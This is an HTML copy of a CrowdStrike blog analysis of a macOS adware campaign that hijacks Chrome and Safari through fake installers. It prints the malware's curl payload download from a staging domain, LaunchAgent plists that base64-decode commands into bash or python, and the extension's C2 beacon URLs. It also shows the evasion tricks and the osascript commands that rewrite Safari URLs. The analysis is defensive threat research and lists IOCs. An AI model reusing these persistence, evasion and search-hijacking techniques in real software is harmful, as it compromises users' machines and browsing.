@@ -1,0 +1,204 @@
+<div>
+<h1>CrowdStrike Uncovers New MacOS Browser Hijacking Campaign</h1>
+<p>June 2, 2022</p> <a href="https://www.crowdstrike.com/blog/author/epp-content-research-team/" rel="author" title="Posts by EPP Content Research Team">EPP Content Research Team</a> <a href="https://www.crowdstrike.com/blog/category/endpoint-protection/" title="Endpoint &amp; Cloud Security">Endpoint &amp; Cloud Security</a>
+<img alt="" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="698" src="https://www.crowdstrike.com/wp-content/uploads/2022/06/Blog_1060x698-1-1-1.jpeg" style="max-width:800px;height:auto;width:auto;" width="1060"/>
+<ul>
+<li>CrowdStrike analyzed a new browser hijacking campaign that targets MacOS</li>
+<li>The purpose of the campaign is to inject ads into the user’s Chrome or Safari browser </li>
+<li>The <a href="https://www.crowdstrike.com/endpoint-security-products/falcon-platform/">CrowdStrike Falcon® platform</a> provides continuous protection against browser hijacking threats by offering real-time visibility across workloads</li>
+</ul>
+<p>The CrowdStrike Content Research team recently analyzed a MacOS targeted browser hijacking campaign that modifies the user’s browsing experience to deliver ads. Research began with a variant that uses a combination of known techniques to deliver, persist and sideload a Chrome extension. Analysis of the fake Chrome installer uncovered the use of more than 40 unique dropper files to install the extension. During analysis of the original samples, an additional variant was discovered that targets Safari browser usage and employs a combination of AppleScript and Python to accomplish similar browser hijacking activity. At the time of writing, more than 15 unique dropper files have been found for this particular variant.</p>
+<h2>Technical Analysis</h2>
+<h3>Fake Chrome Installer</h3>
+<p>The Chrome variant sideloads a malicious Chrome extension with the purpose of hijacking browser activity and delivering custom ad content. </p>
+<h4>Installation</h4>
+<p>The initial infection vector uses an Apple Disk Image (DMG) that masquerades as legitimate software and video files. Once the DMG file is mounted on the machine and the user is tricked into clicking the application icon, an install script is executed to initialize the setup process, as shown in Figure 1.</p>
+<img alt="" class="size-full wp-image-122835" height="856" src="https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure1.png" style="max-width:800px;height:auto;width:auto;" width="1316"/><p>Figure 1. Example of DMG installation instructions</p>
+<p>While the DMG file names are masquerading as software and video files, they all share a similarity and result in a mounted volume with the name <code>Application Installer</code>. The mounted volume prompts the user to execute an apparent Chrome installation application, but this is actually a malicious script file contained in the DMG. Early variants of this family used script files named <code>installer.command</code>. Later variants use <code>ChromeInstaller.command </code>script files. </p>
+<p>Upon initialization, the install script hides visible Terminal windows from the user’s view by leveraging <code>osascript </code>to conceal the installation actions. Then it makes a query for an existing infection by checking the results of <code>launchctl list | grep "chrome.extension"</code> and exits if the command returns any matching <code>launchd</code> jobs. </p>
+<p>Prior to downloading the extension, an attempt is made to validate the returned status code from the web server using curl:</p>
+<code>status_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https[:]//ckgrounda[.]com/archive.zip )</code>
+<p>If the return code is 200, curl is again used to download and write the archive file with the zipped payload written to <code>/private/var/temp/[uuid].zip</code>. The native <code>unzip</code> utility is used to expand the archive into a new folder also named with a random UUID in <code>/private/var/temp/</code>. Any other return code results in the script exiting. </p>
+<h4>Persistence </h4>
+<p>The Chrome extension is installed and maintained by a number of plist files written to the user directory <code>~/Library/LaunchAgent/</code>. To conceal the malicious behavior, the underlying commands in the plist files are obfuscated with Base64 encoding.</p>
+<code>&lt;key&gt;ProgramArguments&lt;/key&gt;
+&lt;array&gt;
+&lt;string&gt;sh&lt;/string&gt;
+&lt;string&gt;-c&lt;/string&gt;
+&lt;string&gt;echo aWYgcHMg -[ SNIP ]- Zmk= | base64 --decode | bash&lt;/string&gt;
+&lt;/array&gt;
+</code>
+<p>Below is a list of each file created, the Base64 decoded file contents and the description.</p>
+<table class="orange">
+<tbody>
+<tr class="top-row bg-orange">
+<td>StartInterval Values (seconds)</td>
+<td>Decoded Plist Payloads</td>
+<td>Description</td>
+</tr>
+<tr>
+<td colspan="3"><code>com.chrome.extension.plist</code></td>
+</tr>
+<tr>
+<td>31</td>
+<td><code>if ps ax | grep -v grep | grep 'Google Chrome' &amp;&gt; /dev/null; then echo running; EXTENSION_SERVICE='Google Chrome --load-extension'; if ps ax | grep -v grep | grep 'Google Chrome --load-extension' &amp;&gt; /dev/null; then echo e running; else pkill -a -i 'Google Chrome'; sleep 1 ; open -a 'Google Chrome' --args --load-extension='/private/var/temp/[rand uuid]' --restore-last-session --noerrdialogs --disable-session-crashed-bubble; fi; else echo not running; fi</code></td>
+<td>Resolve/hide crashes</td>
+</tr>
+<tr>
+<td colspan="3"><code>com.chrome.extensions.plist</code></td>
+</tr>
+<tr>
+<td>21600</td>
+<td><code>pkill -a -i 'Google Chrome'; sleep 1 ; open -a 'Google Chrome' --args --load-extension='/private/var/temp/[rand uuid]' --restore-last-session --noerrdialogs --disable-session-crashed-bubble;</code></td>
+<td>Force the extension load</td>
+</tr>
+<tr>
+<td colspan="3"><code>com.chrome.extensionsPop.plist</code></td>
+</tr>
+<tr>
+<td>3600</td>
+<td><code>open -na 'Google Chrome' --args -load-extension='/private/var/temp/[rand uuid]' --new-window "$https[:]//ationwindon[.]com/?tid=949115"</code></td>
+<td>Ensure ad is always open</td>
+</tr>
+</tbody>
+</table>
+<p>As shown above, the naming convention of the plist files attempts to evade general suspicion by masquerading as components of the Chrome browser. </p>
+<p>All of the Launch Agents utilize a <code>StartInterval</code> parameter. This means that each is executed periodically on its defined interval. </p>
+<p>Note that the <code>com.chrome.extensionsPop.plist</code> appears to have a typo in the “<code>-load-extension</code>” parameter; however, the command works as expected and is successful in sideloading the extension. A notable commonality across the variants analyzed is the check-in domain <code>ationwindon[.]com</code>. </p>
+<h4>Extension Initialization </h4>
+<p>The extension is sideloaded from disk via any of the plists using the <code>--load-extension</code> parameter. The extension utilizes a number of alarms and blocking listeners to facilitate its browser hijacking and ad content delivery.</p>
+<p>The extension contains a hard-coded command-and-control (C2) domain referred to in this blog as <code>C2Domain</code>, and a unique identifying string defined as <code>ExtensionId</code>. These static values are used to reference the C2 domain and extension ID in the blog; however, each extension analyzed contained its own unique values. </p>
+<p>The extension contains a system to provide time-dependent storage for ad content and dynamic parameters sent from the C2. This is accomplished by storing and retrieving JSON objects from Chrome’s <code>localStorage</code>. Key/Value pairs are stored with <code>expiry</code> value. Retrieved objects with an <code>expiry</code> value less than the current time are returned as <code>null</code> and removed from <code>localStorage</code>. </p>
+<p>Upon execution, the extension establishes two Chrome alarms: a heartbeat and an update frequency for ad content. The heartbeat alarm fires every three hours while the ad alarm triggers every 30 minutes. After configuring these parameters, the extension beacons to the C2 with a message signifying a successful install. It is sent using the following format:</p>
+<code>https://[C2Domain]/install?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]</code>
+<p>Following the beacon and an initial heartbeat, the extension enumerates all installed extensions running in Chrome using a <code>chrome.management.getAll()</code> call. The <code>ExtensionInfo[]</code> response is sent as JSON in a POST message back to the C2 domain.</p>
+<p>The POST response contains a list of extensions IDs in a JSON list. These IDs are then used to disable extensions using <code>chrome.management.setEnabled()</code> API calls. This is done to remove extensions that conflict with the hijacking functionality. </p>
+<p>As a final install step, the extension modifies a policy in Chrome to disable search suggestions by disabling the <code>searchSuggestEnabled</code> field. This also disables keyword search and autocompletion capabilities. </p>
+<p>The first listener monitors web requests destined for the hardcoded C2 domain. Any requests to the domain are appended with the <code>ExtensionId</code> as a <code>requestHeader</code>. This additional request header serves to identify victims. Responses from this domain are also monitored for a randomness variable (<code>rand</code>) in the <code>requestHeader</code>. This randomness variable is stored in <code>localStorage</code> with an expiration time of 300 seconds. The randomness variable is used to provide inconsistency to the search hijacking functionality.</p>
+<p>Hijack via a Blocking Listener</p>
+<p>Next, the extension establishes a blocking listener to facilitate the search hijacking. This listener runs on outbound requests to URLs containing “<code>google.</code>”, “<code>search.yahoo</code>” or “<code>bing.</code>”. If the requests contain search parameters, a random float value is generated between 0 and 100. If the random float is less than the <code>rand</code> variable, then the search request is redirected to the following URL:</p>
+<code>https://[C2Domain]/search?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;is=[OriginalSearchRedirectBoolean]&amp;q=[OriginalSearchQuery]</code>
+<p>It can be theorized that the <code>rand</code> variable exists to evade users’ suspicion that their machines are infected. With it set, only a portion of a user’s web searches will be redirected.</p>
+<h4>Defense Evasion</h4>
+<p>The extension configures three techniques to evade discovery and deletion. The extension adds a listener for <code>chrome://extensions</code>, and any requests to that page will be redirected to <code>chrome://settings</code>. The extension configures <code>onClicked</code> actions so that a left or right-click on the extension’s context menu will also open a tab to <code>chrome://settings</code>. Finally, if the user is able to bypass these barriers, the extension configures an <code>UninstallURL</code> so a tab to the following URL will be opened if the extension is successfully removed:</p>
+<code>https://[C2Domain]/uninstall?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]</code>
+<h4>Core Functionality</h4>
+<p>The core functionality of the extension comes from its two alarms. These alarms run periodically to maintain the C2 heartbeat and update the delivered ad content. </p>
+<p>Heartbeat Alarm</p>
+<p>Every three hours, the heartbeat alarm makes a series of callouts to the C2. First, it makes a GET request to:</p>
+<code>https://[C2Domain]/hb?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]</code>
+<p>This is followed by a GET request to <code>https://[C2Domain]/redsync</code>, and the response of this request is sent in a call to:</p>
+<code>https://[C2Domain]/sync?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]&amp;info=[Response]</code>
+<p>The heartbeat and response do not influence the client-side code. The extension does not handle any fail requests or returned data. It just serves as a check-in to the C2 and is simply a notification of a live infection. </p>
+<p>Ad Alarm</p>
+<p>The ad alarm runs every 30 minutes. Its objective is to ensure that the ad content is updated and running. To do this, it retrieves the ad object from the expiry storage. If it is expired, new ad content is loaded from:</p>
+<code>https://[C2Domain]/ad?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]</code>
+<p>This content is opened in a new tab, and the new tab’s <code>tabId</code> is stored in expiry storage with a 24-hour expiration date. If the alarm runs and the ad content is not expired, then it checks to see if the <code>tabId</code> is still open. If it isn’t, it proceeds as if the ad content is expired.</p>
+<h3>Fake Safari Installer</h3>
+<p>Research into this family led to the discovery of a variant targeting the Safari browser. This variant shares many similarities to the Chrome variant; however, it is technically less advanced. </p>
+<h4>Installation</h4>
+<p>The Safari installer variant shares a similar delivery mechanism via DMGs with random names and the <code>Application Installer</code> volume name; however, all Safari DMGs have been observed to use script files with the naming convention <code>SafariInstaller.command</code>.</p>
+<p>Much like the Chrome variant, the <code>SafariInstaller.command</code> files download their payload from statically defined staging servers. The response contains two Base64 data blobs that decode into Python code. These blobs are inserted directly into two plist files. Unlike the Chrome variant, the plist files pipe the Base64 decoded data to Python and then bash.</p>
+<code>&lt;key&gt;ProgramArguments&lt;/key&gt;
+&lt;array&gt;
+&lt;string&gt;sh&lt;/string&gt;
+&lt;string&gt;-c&lt;/string&gt;
+&lt;string&gt;echo aW1w -[ SNIP ]- kKQ== | base64 --decode | python | bash&lt;/string&gt;
+&lt;/array&gt;</code>
+<h4>Persistence and Core Functionality</h4>
+<p>The first plist, <code>~/Library/LaunchAgents/com.safarii.extension.plist</code>, does not use a <code>StartInterval</code> value like the Chrome variant, but instead uses <code>RunAtLoad</code>. The <code>RunAtLoad</code> parameter is executed when the user logs into their computer. Note that the plist file does not use the correct spelling of Safari. </p>
+<p>At the time of writing, the Python payload runs in an infinite loop and serves two functions:</p>
+<ol>
+<li>Sends a periodic heartbeat (approximately every hour)</li>
+<li>Monitors search engine queries in Safari</li>
+</ol>
+<p>The script ensures that only one copy is running via a call to <code>ps aux</code>. If any process commandline contain <code>base64 –decode | python</code>, then the newly executing script exits. </p>
+<p>The hourly heartbeat calls out to:</p>
+<code>https://[C2Domain]/hb?ext=saf&amp;ver=[ScriptVersion]&amp;is=0&amp;dd=[ScriptId]&amp;q=[LastSearchQuery]</code>
+<p>Similar to the Chrome extension, the Python script monitors searches to Google, Yahoo and Bing through the use of AppleScript. Every loop interval (~0.1 seconds), the following <code>osascript</code> process is used to capture the currently opened Safari URL:</p>
+<code>osascript -e 'tell application "safari"
+set curURL to URL in front document
+return curURL
+end tell’</code>
+<p>If a new search query is found, the Safari window’s URL is overwritten with: </p>
+<code>https://[C2Domain]/search?ext=saf&amp;ver=[ScriptVersion]&amp;is=0&amp;dd=[ScriptId]&amp;q=[OriginalSearchQuery]</code>
+<p>This is accomplished by the following osascript process: </p>
+<code>osascript -e 'tell application "safari"
+set URL in front document to "[URL]"
+end tell’</code>
+<p>If the script detects that it does not have the necessary transparency, consent and control (TCC) permissions to launch <code>osascript</code> or call out to the C2, it will launch a <code>tccutil</code> subprocess to reset all permissions for Apple Events. By resetting this value, the user will be re-prompted with a security warning. The author is hoping that because of the new prompt, the user will allow the Apple Events communication. </p>
+<p>The <code>SafariInstaller.command</code> script writes its second plist file to <code>~Library/LaunchAgents/com.extension.pop.plist</code>. This plist serves the same purpose as <code>com.chrome.extensionsPop.plist</code>. It uses Python and an <code>os.system</code> call to open a new Safari window to the same <code>https[:]//ationwindon[.]com</code> domain observed in the Chrome installer variants.</p>
+<h2>Impact</h2>
+<p>Both variants result in an altered user experience. Accomplished through the Chrome extension or AppleScript, both variants are highly persistent and perform browser hijacking. They are successful in continually displaying ad content and redirecting web searches to attacker-controlled redirect pages. </p>
+<h2>The Falcon Platform’s Continuous Monitoring and Visibility</h2>
+<p>The Falcon platform takes a layered approach to protect workloads. Using on-sensor and cloud-based machine learning, behavior-based detection using <a href="https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/">indicators of attack (IOAs)</a>, and intelligence related to tactics, techniques and procedures (TTPs) employed by threats and threat actors, the Falcon platform enables visibility, threat detection and continuous monitoring for any environment, reducing the time to detect and mitigate threats.</p>
+<a href="https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure2.png" rel="noopener" target="_blank"><img alt="" class="wp-image-122848 size-full" height="1085" src="https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure2.png" style="max-width:800px;height:auto;width:auto;" width="2342"/></a><p>Figure 2. Suspicious plist creation (Click to enlarge)</p>
+<p>The Falcon platform’s behavior-based IOAs detect and prevent behaviors that indicate malicious intent. For example, Falcon detects and prevents behavior such as the installation of suspicious ASEP plist files (see Figure 2) and execution of sideloaded, suspicious Chrome extensions (see Figure 3). </p>
+<a href="https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure3.png" rel="noopener" target="_blank"><img alt="" class="wp-image-122849 size-full" height="1120" src="https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure3.png" style="max-width:800px;height:auto;width:auto;" width="2877"/></a><p>Figure 3. Previously infected host IOA detection (Click to enlarge)</p>
+<h2>Indicators of Compromise (IOCs)</h2>
+<p>The hashes below are a small subset of the total DMGs and corresponding installer scripts uncovered in the campaign, to be used as reference samples.</p>
+<table class="orange">
+<tbody>
+<tr class="top-row bg-orange">
+<td>File</td>
+<td>SHA256</td>
+</tr>
+<tr>
+<td><code>Your File Is Ready To Download.dmg</code></td>
+<td><code>46bbb3103bdc2263a0b50eb80815705f61885b3e3e132e5e5c5ff822512085ca</code></td>
+</tr>
+<tr>
+<td><code>SafariInstaller.command</code></td>
+<td><code>e31607b87355b4ae3e5f96c6b48ed783e6b706fb1c2ab6a1ff25a13af615bca7</code></td>
+</tr>
+<tr>
+<td><code>nature_beautiful_short_video_720p_hd (2).dmg</code></td>
+<td><code>81ac23cc9dba6bed6e33d172e011ead46254a29483c287f35c670d81bc9785b7</code></td>
+</tr>
+<tr>
+<td><code>ChromeInstaller.command</code></td>
+<td><code>e734ec9832f8385eb737dd024eb96d53d0d3cb534a72afb4730db8e7e6162fcc</code></td>
+</tr>
+<tr>
+<td><code>BigBrother_AnotherStory-0.07.p2.00-mac.zip.dmg</code></td>
+<td><code>53ddfdb4c01ace20322647eead73ddf77e6d9613b73ca90521c2e57063be387b</code></td>
+</tr>
+<tr>
+<td><code>installer.command</code></td>
+<td><code>83d6ab417c9a362e6292dd8d85032b623889d9154b9d357fd8576f843fbecae9</code></td>
+</tr>
+</tbody>
+</table>
+<table class="orange" width="624">
+<tbody>
+<tr class="top-row bg-orange">
+<td>Domains</td>
+</tr>
+<tr>
+<td><code>ationwindon[.]com</code></td>
+</tr>
+</tbody>
+</table>
+<h4>Additional Resources</h4>
+<ul>
+<li>Learn more about <a href="https://www.crowdstrike.com/falcon-endpoint-security-for-macos/">Falcon Endpoint Security for macOS</a>.</li>
+<li>Check out <a href="https://crowdstrike.wistia.com/medias/eitp4iya00">a video demo</a> for Falcon Endpoint Security for macOS.</li>
+<li>Test CrowdStrike next-gen AV for yourself with a<a href="https://go.crowdstrike.com/try-falcon-prevent.html"> free trial of Falcon Prevent™</a>.</li>
+</ul>
+<ul class="list-share-buttons">
+<li class="share-button">
+<a class="tweet-btn" href="https://twitter.com/share?text=CrowdStrike+Uncovers+New+MacOS+Browser+Hijacking+Campaign&amp;url=https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/" rel="noopener noreferrer" target="_blank">
+Tweet
+</a>
+</li>
+<li class="share-button">
+<a class="li-btn" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/&amp;title=CrowdStrike+Uncovers+New+MacOS+Browser+Hijacking+Campaign" rel="noopener noreferrer" target="_blank">
+Share
+</a>
+</li>
+</ul>
+<a href="https://go.crowdstrike.com/try-falcon-prevent.html">
+<img class="post_cta" src="https://www.crowdstrike.com/wp-content/themes/main-theme/dist/images/blog/breaches-stop-here-post-cta.jpeg" style="max-width:80%;height:auto;width:auto;"/>
+</a>
+<h5>Related Content</h5>
+</div>
